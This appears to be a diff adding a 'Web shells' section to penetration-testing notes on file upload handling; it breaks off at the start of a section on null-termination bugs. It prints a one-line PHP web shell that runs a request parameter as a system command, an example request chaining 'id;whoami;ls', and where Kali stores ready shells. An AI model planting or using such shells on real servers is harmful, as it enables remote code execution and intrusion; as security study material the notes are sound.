@@ -1,6 +1,23 @@
 # Notes on file handling
 
+## Web shells
+
+Managing to upload the following .php file to a web server with a file upload vulnerability results in RCE if the webserver can run php. The code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.
+
+```php
+<?php
+    echo system($_GET["cmd"]);
+?>
+```
+
+The server executes the command set in the cmd request parameter:
+
+`http://vulnerable.site/uploads?webshell.php?cmd=id;whoami;ls`
+
+The Kali webshells are located in */usr/share/webshells*
+
 ## Null termination bugs
+
 When testing file handling vulns on php (example):
 
 ```
